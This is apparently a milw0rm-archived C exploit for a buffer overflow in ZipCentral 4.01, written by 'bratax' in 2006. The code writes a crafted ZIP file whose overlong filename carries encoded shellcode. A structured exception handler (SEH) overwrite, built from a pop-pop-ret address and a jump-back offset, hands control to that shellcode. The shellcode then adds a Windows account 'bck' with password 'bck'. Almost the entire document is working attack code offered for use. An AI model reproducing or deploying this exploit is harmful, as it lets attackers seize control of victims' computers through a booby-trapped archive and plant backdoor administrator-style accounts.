/*
ZipCentral 4.01 Exploit by bratax (http://www.bratax.be/)

Soooooo many thanks to BuzzDee and c0rrupt for helping me with all the
problems I encountered :) Wouldn't have finished this without you guys!

Greetz to everyone I like... (no, that doesn't include you turb00)!

******************************

Some technical info:
- vulnerability is available here:
  http://secunia.com/secunia_research/2006-35/advisory
- using SEH to exploit this
- some code might look weird in this source.. (e.g. shellcode, offsets,...)
  this is because a lot of values are changed in memory.. so use your favorite
  debugger to see the real values and codes
- shellcode adds a windows user "bck" with password "bck" (thx metasploit)
- tested on XP Pro English (SP2) and XP Home Dutch (SP2)

*/

#include <stdio.h>
#include <string.h>

unsigned char scode[] =
"\x89\x03\x59\x89\x05\x8a\x9b\x98\x98\x98\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34\x4e\x43\x4b\x48\x4e\x57"
"\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x34\x4a\x31\x4b\x58"
"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x43\x4b\x58"
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x45\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x38"
"\x4f\x35\x46\x52\x41\x30\x4b\x4e\x48\x56\x4b\x38\x4e\x50\x4b\x44"
"\x4b\x38\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x38\x4e\x51\x4b\x58"
"\x41\x50\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x33"
"\x42\x4c\x46\x46\x4b\x58\x42\x54\x42\x53\x45\x58\x42\x4c\x4a\x57"
"\x4e\x50\x4b\x58\x42\x34\x4e\x50\x4b\x58\x42\x57\x4e\x41\x4d\x4a"
"\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x58\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x56\x4e\x33\x4f\x35\x41\x33"
"\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x57"
"\x42\x55\x4a\x56\x42\x4f\x4c\x48\x46\x50\x4f\x35\x4a\x46\x4a\x49"
"\x50\x4f\x4c\x48\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x56\x4d\x56"
"\x46\x46\x50\x42\x45\x46\x4a\x57\x45\x56\x42\x52\x4f\x42\x43\x36"
"\x42\x52\x50\x46\x45\x56\x46\x57\x42\x52\x45\x57\x43\x47\x45\x36"
"\x44\x47\x42\x42\x44\x46\x43\x56\x4b\x36\x42\x42\x44\x56\x43\x56"
"\x4b\x46\x42\x52\x4f\x42\x41\x34\x46\x44\x46\x34\x42\x32\x48\x42"
"\x48\x32\x42\x32\x50\x56\x45\x46\x46\x57\x42\x52\x4e\x36\x4f\x36"
"\x43\x46\x41\x56\x4e\x56\x47\x36\x44\x37\x4f\x46\x45\x37\x42\x37"
"\x42\x52\x41\x54\x46\x56\x4d\x36\x49\x36\x50\x36\x49\x56\x43\x37"
"\x46\x57\x44\x47\x41\x56\x46\x37\x4f\x56\x44\x47\x43\x57\x42\x52"
"\x44\x56\x43\x46\x4b\x46\x42\x32\x4f\x52\x41\x54\x46\x34\x46\x44"
"\x42\x30\x5a";

char head[] = "\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00"
			 "\xB7\xAC\xCE\x34\x00\x00\x00\x00\x00\x00"
			 "\x00\x00\x00\x00\x00\x00\x14\x08\x00";
char middle[] = "\x2e\x74\x78\x74\x50\x4B\x01\x02\x14\x00"
				"\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34"
				"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
				"\x00\x00\x14\x08\x00\x00\x00\x00\x00\x00"
				"\x01\x00\x24\x00\x00\x00\x00\x00\x00";
char tail[] = "\x2e\x74\x78\x74\x50\x4B\x05\x06\x00\x00"
			 "\x00\x00\x01\x00\x01\x00\x42\x08\x00\x00"
			 "\x32\x08\x00\x00\x00";

int main(int argc,char *argv[])
{
	char overflow[657]; // is 657 bytes big enough for a filename?
	char overflow2[1407];
FILE *vuln;
if(argc == 1)
{
    printf("ZipCentral 4.01 Buffer Overflow Exploit.\n");
    printf("Coded by bratax (http://www.bratax.be/).\n");
    printf("Usage: %s <outputfile>\n",argv[0]);
    return 0;
}
vuln = fopen(argv[1],"w");

//build overflow buffer here.
memset(overflow,0x41,sizeof(overflow)); //fill with crap
memcpy(overflow+2, scode, 483); // our shellcode
memcpy(overflow+653, "\x82\x6E\xEC\x98", 4); // jmp back to shellcode
memset(overflow2, 0x42, sizeof(overflow2)); // more crap
memcpy(overflow2+0,"\x98\x85\x8E\x00", 4); // pop pop ret
// pop pop ret somewhere within 0x00xxxxFF.. needed because of 2 reasons
// which I'm not going to explain here right now..
// notice that 008E8598 will be changed in memory and will become 00C4E0FF
// this might be different on other machines, but will always be 00xxE0FF


if(vuln)
{
    //Write file
    fwrite(head, 1, sizeof(head), vuln);
    fwrite(overflow, 1, sizeof(overflow), vuln);
    fwrite(overflow2, 1, sizeof(overflow2), vuln);
    fwrite(middle, 1, sizeof(middle), vuln);
    fwrite(overflow, 1, sizeof(overflow), vuln);
    fwrite(overflow2, 1, sizeof(overflow2), vuln);
    fwrite(tail, 1, sizeof(tail), vuln);
    fclose(vuln);
}
printf("File written.\nOpen with ZipCentral 4.01 to exploit.\n");
return 0;
}

// milw0rm.com [2006-08-30]
